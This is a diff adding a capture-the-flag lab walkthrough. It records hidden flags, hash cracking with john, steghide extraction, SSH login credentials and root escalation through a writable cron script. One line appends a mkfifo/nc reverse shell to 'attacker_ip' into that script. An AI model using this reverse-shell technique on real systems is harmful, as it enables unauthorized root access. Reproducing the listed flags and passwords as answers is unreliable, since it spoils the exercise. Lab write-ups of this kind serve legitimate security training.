@@ -1,0 +1,37 @@
+#Flag1
+located at page source of <IP>:80/hidden/whatever
+raw: ZmxhZ3tmMXJzN19mbDRnfQ==<
+base64 decode: flag{f1rs7_fl4g}
+
+#Flag2
+located at <IP>:65524/robots.txt
+raw: a18672860d0510e5ab6699730763b250
+decode using md5hashing.net/hash/md5/
+decoded: flag{1m_s3c0nd_fl4g}
+
+#Flag3
+located at page source of <IP>:65524
+flag{9fdafbd64c47471a8f54cd3fc64cd312}
+
+#Hidden Directory
+located at page source of <IP>:65524
+raw: :ObsJmP173N2X6dOrAgEAL0Vu
+base 62 decode: /n0th1ng3ls3m4tt3r
+->text on page: 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
+->crack using md5hashing.net/hash/gost or john --wordlist=easypeasy.txt --format=gost <ihash>
+->cracked: mypasswordforthatjob
+->use as password to decode steg binarycodepixabay.jpg from the same page (steghide extract -sf binarycodepixabay.jpg -p mypasswordforthatjob) to reveal secrettext.txt
+
+#SSH@PORT:6498
+use secrettext.txt content
+username: boring
+password (decoded binary): iconvertedmypasswordtobinary
+->user.txt (raw): synt{a0jvgf33zfa0ez4y}
+->user.txt (rot13): flag{n0wits33msn0rm4l}
+checking /etc/crontab
+->found * *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
+->use this to run as root, use reverse shell
+->echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker_ip 9001 >/tmp/f" >> /var/www/.mysecretcronjob.sh
+->on attacker pc use `nc -lnvp 9001`
+->.root.txt: flag{63a9f0ea7bb98050796b649e85481845}
+-->.root.txt can also be viewed using the wall command inside .mysecretcronjob.sh by appending the command: wall `cat /root/.root.txt
